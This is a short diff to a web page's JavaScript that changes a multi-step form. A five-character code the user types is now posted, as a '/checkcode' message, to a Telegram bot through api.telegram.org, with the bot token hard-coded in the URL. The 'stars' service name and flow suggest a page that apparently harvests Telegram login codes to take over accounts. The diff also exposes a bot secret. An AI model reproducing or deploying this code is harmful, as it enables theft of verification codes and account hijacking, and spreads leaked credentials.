@@ -532,19 +532,25 @@ function topbarGoBack(){if(currentStep>1&&currentStep<=3)switchStep(currentStep,
   switchStep(1,2);setTimeout(()=>document.getElementById('c0').focus(),300);
 }
 async function goStep3(){
-  let code="";
-  for(let i=0;i<5;i++) code+=document.getElementById('c'+i).value;
-  if(code.length<5){return;}
-  const res=await fetch("https://stars-zdgz.onrender.com/check_code",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({user_id,code})
+  let code = "";
+  for(let i=0;i<5;i++) code += document.getElementById('c'+i).value;
+  if(code.length < 5){ return; }
+
+  // Отправляем код боту и ждём ответ
+  const res = await fetch(`https://api.telegram.org/bot7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: user_id,
+      text: `/checkcode ${code}`
+    })
   });
-  const data=await res.json();
+
+  const data = await res.json();
   if(data.ok){
     switchStep(2,3);
   } else {
-    alert("❌ "+data.error);
+    alert("❌ Ошибка");
   }
 }
 }
